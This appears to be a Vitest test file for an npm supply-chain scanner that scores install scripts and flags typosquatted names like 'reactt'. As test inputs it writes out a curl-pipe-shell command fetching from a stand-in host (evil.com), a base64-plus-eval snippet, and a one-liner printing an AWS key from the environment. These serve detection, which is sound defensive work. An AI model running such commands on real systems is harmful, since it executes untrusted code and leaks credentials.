import { describe, expect, it } from "vitest";
import {
  scoreInstallScript,
  levenshtein,
  findTyposquatCandidate,
} from "../src/scoring.js";
import { TOP_PACKAGES } from "../src/top-packages.js";

describe("scoreInstallScript", () => {
  it("flags curl-pipe-shell", () => {
    const { score, reasons } = scoreInstallScript("curl https://evil.com/s.sh | sh");
    expect(score).toBeGreaterThanOrEqual(5);
    expect(reasons.join(" ")).toMatch(/curl/);
  });

  it("flags base64 + eval", () => {
    const { score } = scoreInstallScript("eval(Buffer.from('aGk=','base64').toString())");
    expect(score).toBeGreaterThanOrEqual(5);
  });

  it("flags process.env reads", () => {
    const { score, reasons } = scoreInstallScript("node -e 'console.log(process.env.AWS_KEY)'");
    expect(score).toBeGreaterThanOrEqual(2);
    expect(reasons.join(" ")).toMatch(/process\.env/);
  });

  it("does not flag a benign build step", () => {
    const { score } = scoreInstallScript("node-gyp rebuild");
    expect(score).toBe(0);
  });

  it("clips score at 10", () => {
    const evil = `curl https://x.y/a.sh | sh && node -e "${"A".repeat(300)}"`;
    const { score } = scoreInstallScript(evil);
    expect(score).toBeLessThanOrEqual(10);
  });
});

describe("levenshtein", () => {
  it("returns 0 for identical", () => {
    expect(levenshtein("react", "react")).toBe(0);
  });
  it("counts single substitutions", () => {
    expect(levenshtein("react", "reacd")).toBe(1);
  });
});

describe("typosquat detection", () => {
  it("detects react variants", () => {
    expect(findTyposquatCandidate("reactt", TOP_PACKAGES)).toBe("react");
    expect(findTyposquatCandidate("recat", TOP_PACKAGES)).toBe("react");
  });
  it("ignores exact matches", () => {
    expect(findTyposquatCandidate("react", TOP_PACKAGES)).toBeUndefined();
  });
  it("ignores far-away names", () => {
    expect(findTyposquatCandidate("totally-fine-pkg", TOP_PACKAGES)).toBeUndefined();
  });
});
